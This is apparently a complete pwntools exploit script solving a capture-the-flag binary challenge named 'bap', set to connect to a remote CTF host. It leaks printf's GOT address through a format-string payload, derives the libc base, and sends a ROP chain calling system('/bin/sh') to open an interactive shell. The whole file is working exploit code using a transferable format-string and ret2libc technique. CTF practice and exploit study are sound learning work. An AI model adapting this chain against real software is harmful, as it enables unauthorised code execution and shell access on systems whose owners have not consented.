#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './bap_patched' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'challs.actf.co', 31323 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+81
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(libc)
    
    payload = b'%7$s||||'
    payload += p64(elf.got['printf'])
    payload += b'AAAABBBB'
    payload += p64(elf.sym['_start'])
    io.sendlineafter(b': ', payload)
    
    got_leak = unpack(io.recv(6).ljust(8, b'\x00'))
    libc.address = got_leak - libc.sym['printf']
    
    info(f'got leak: {hex(got_leak)}')
    info(f'libc base: {hex(libc.address)}')
    
    pop_rdi = rop.rdi.address + libc.address
    ret = rop.ret.address + libc.address
    
    system = libc.sym['system']
    bin_sh = next(libc.search(b'/bin/sh'))
    
    payload = flat({
        24: [
            pop_rdi,
            bin_sh,
            ret,
            system
        ]
    })
    io.sendline(payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()